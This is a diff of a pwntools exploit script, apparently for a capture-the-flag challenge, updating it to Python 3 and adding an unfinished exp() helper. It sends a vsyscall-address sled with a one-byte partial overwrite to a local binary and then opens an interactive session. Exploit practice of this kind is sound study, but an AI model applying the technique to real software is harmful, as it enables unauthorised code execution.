@@ -1,4 +1,4 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 # -*- coding:utf-8 -*-
 
 from pwn import *
@@ -7,8 +7,23 @@ import time
 import struct
 
 # context.log_level = "debug"
-sh = process('./vsyscall_origin')
-elf = ELF('./vsyscall_origin')
+binelf = './vsys-1'
+sh = process(binelf)
+elf = ELF(binelf)
+debug = 1
+
+def exp(debug):
+    global r
+    if debug == 1:
+        r = process(binelf)
+    r.recvuntil('Your input :\n')
+    ret_addr = 0xFFFFFFFFFF600000
+
+    #r.send(q
+
+
+
+
 
 # 生成调试文件
 try:
@@ -18,10 +33,12 @@ try:
 except Exception as e:
 	print(e)
 
-ret_addr = 0xFFFFFFFFFF600000
 
 # pause()
-sh.send(p64(ret_addr) * 27 + '\x4e')
+#newaddr = p64(ret_addr) * 27 + bytes.fromhex('4e')
+#print(newaddr)
+print(p64(ret_addr) * 27 + b'\x4e')
+sh.send(p64(ret_addr) * 27 + b'\x4e')
 
 sh.interactive()
 
